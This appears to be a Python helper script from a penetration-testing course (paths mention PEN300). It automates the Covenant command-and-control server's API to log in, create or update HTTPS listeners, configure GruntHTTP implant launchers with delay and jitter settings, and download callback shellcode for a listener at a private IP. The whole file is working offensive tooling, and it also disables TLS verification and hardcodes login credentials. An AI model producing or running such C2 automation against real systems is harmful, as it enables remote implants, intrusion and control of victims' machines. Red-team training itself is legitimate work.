import os
import sys
import time
from pathlib import Path
from functools import wraps

import cert
import requests
requests.packages.urllib3.disable_warnings()

if sys.version_info.major == 2:
    from urlparse import urlparse
else:
    from urllib.parse import urlparse


TAG = os.path.basename(__file__)

def log(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        print('[+] %s: %s' % (TAG, fn.__name__))
        return fn(*args, **kwargs)
    return wrap

def Has(var):
    if isinstance(var, str):
        var = [var]
    def innerD(fn):
        @wraps(fn)
        def wrap(*args, **kwargs):
            for _ in var:
                if globals().get(_) is None:
                    print('Please initialize "%s" first!' % _)
                    exit(0)
            return fn(*args, **kwargs)
        return wrap
    return innerD

class BearerAuth(requests.auth.AuthBase):
    @Has('token')
    def __call__(self, r):
        r.headers["authorization"] = "Bearer " + token
        return r

endpoint = None
token = None
HOME = None

def init(url, home):
    global endpoint, HOME
    endpoint = url
    HOME = Path(home)

@Has('endpoint')
def isLocal():
    _ = urlparse(endpoint).netloc.split(':')[0]
    if _ == '127.0.0.1':
        return True
    return False

@log
@Has('endpoint')
def login(uname, passd):
    global token
    r = requests.post(endpoint + '/api/users/login', json=dict(userName=uname, password=passd), verify=False).json()
    assert r['success'], 'login failed'
    token = r['covenantToken']

@log
@Has('token')
def listeners():
    return requests.get(endpoint + '/api/listeners', auth=BearerAuth(), verify=False).json()

@log
@Has('token')
def launchers(Type=None):
    result = requests.get(endpoint + '/api/launchers', auth=BearerAuth(), verify=False).json()
    if Type is not None:
        return list(filter(lambda x: x['type'].lower() == Type.lower(), result))
    return result

@log
@Has('token')
def updateListener(info):
    assert 'id' in info
    r = requests.put(endpoint + '/api/listeners', json=info, auth=BearerAuth(), verify=False)
    assert r.status_code == 200

@log
@Has('token')
def addListener(name, addr, port, bindaddr, bindport, ssl=True):
    info = dict(useSSL=ssl, profileId=2, listenerTypeId=1, status='active', bindAddress=bindaddr, bindPort=bindport,
        connectPort=port, connectAddresses=[addr], urls=['http%s://%s:%d' % ('s' if ssl else '', addr, port)], name=name)
    if ssl:
        secret = 'chtsec'
        info['sslCertificate'] = cert.createPkcs12(secret)
        info['sslCertificatePassword'] = secret

    res = requests.post(endpoint + '/api/listeners/http', json=info, auth=BearerAuth(), verify=False)
    if res.status_code != 200:
        print(res.text)
    r = res.json()
    assert r['startTime'] is not None
    return r['id']

@log
@Has('token')
def addLauncher(_type, listenerId, **info):
    _info = {
      "listenerId": listenerId,
      "implantTemplateId": 1, # GruntHTTP (1 in master, 3 in dev)
      "dotNetVersion": info.get('.net', "Net40"),
      "runtimeIdentifier": info.get('runtime', "win_x64"),
      "validateCert": True,
      "useCertPinning": True,
      "delay": 5,
      "jitterPercent": 10,
      "connectAttempts": 5,
      "compressStager": True
    }
    r = requests.post(endpoint + '/api/launchers/' + _type, json=_info, \
            auth=BearerAuth(), verify=False)
    assert r.status_code == 200, r.text
    _id = r.json()['id']
    _info['id'] = _id
    r = requests.put(endpoint + '/api/launchers/' + _type, json=_info, \
            auth=BearerAuth(), verify=False)
    assert r.status_code == 200, r.text
    return _id

@log
@Has('token')
def delLauncher(_id):
    assert requests.delete(endpoint + '/api/launchers/%d' % _id, auth=BearerAuth(), verify=False).status_code == 204

@Has(['endpoint', 'token'])
def listen(addr, port, bindaddr='0.0.0.0', bindport=443):
    # temp setting
    bindport = port
    for l in listeners():
        if l['bindAddress'] == bindaddr and l['bindPort'] == bindport:
            if addr in l['connectAddresses'] and port == l['connectPort']:
                print('listener already exists')
                return l['id']
            # update this listener cuz I need this port
            l['connectAddresses'].append(addr)
            l['connectPort'] = port
            l['covenantToken'] = token
            updateListener(l)
            print('update success')
            return l['id']
    return addListener('O_O', addr, port, bindaddr, bindport, ssl=True)

def fetchData(uri, interval=2.):
    while True:
        r = requests.get(endpoint + uri, auth=BearerAuth(), verify=False)
        if len(r.content) != 0:
            return r.content
        time.sleep(interval)

@Has(['endpoint', 'token'])
def generateShellcode(listenerId, purge=False):
    for l in launchers(Type='shellcode'):
        if listenerId == l['listenerId']:
            if purge:
                delLauncher(l['id'])
            else:
                return fetchData('/api/launchers/%d/download' % l['id'])
    launcher_id = addLauncher('shellcode', listenerId)
    return fetchData('/api/launchers/%d/download' % launcher_id)

if __name__ == '__main__':
    init('https://127.0.0.1:7443', '/Users/tree/Documents/chtsecurity/PEN300/scripts/Covenant/')
    login('tree', 'treetree')
    #print(listeners())
    #print(generateShellcode(1))
    #exit(0)
    _id = listen('192.168.0.10', 80)
    print(_id)
    shellcode = generateShellcode(_id)
    print(repr(shellcode))
